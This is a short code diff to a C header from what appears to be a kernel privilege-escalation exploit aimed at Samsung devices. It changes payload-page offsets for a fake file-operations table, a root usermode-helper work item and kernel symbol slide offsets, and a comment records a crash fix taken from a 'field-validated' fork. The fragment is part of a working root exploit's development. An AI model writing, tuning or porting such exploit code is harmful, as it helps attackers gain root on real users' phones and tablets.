@@ -139,8 +139,8 @@
 #define CALL_USERMODEHELPER_EXEC_WORK \
   (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
-#define ROOT_UMH_WORK_OFF 0x6000
-#define ROOT_UMH_DATA_OFF 0x6200
+#define ROOT_UMH_WORK_OFF 0x7800
+#define ROOT_UMH_DATA_OFF 0x7a00
 
 #define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01608454ULL
 #define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x021b29d8ULL
@@ -162,9 +162,18 @@
 #define SLIDE_SYSCTL_BOOTID_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
+/* Payload-page layout adopted from the field-validated a54x fork (commit
+ * ba37fed; Tab S9 FE V2->V3 evidence): FOPS_OFF 0x2000 overlapped the pipe
+ * buffer area -> intermittent try_module_get crash at the fops stage; the
+ * UMH scratch moved with it to keep the table clear. Our pipe.c
+ * PHYSRW_PROOF_OFF (0x7000) shares the fops offset exactly as the fork's
+ * own committed state does (fork pipe.c:8 + target.h FOPS_OFF 0x7000):
+ * the proof tags are saved+restored around the physrw check, so the fops
+ * table written later at the same offset never collides with live proof
+ * bytes. LOCK/W0/SCRATCH/RIGHT/LEFT/FAKE_TASK offsets are untouched. */
 #define LOCK_OFF 0x2210
 #define W0_OFF 0x2350
-#define FOPS_OFF 0x2000
+#define FOPS_OFF 0x7000
 #define SCRATCH_OFF 0x3000
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
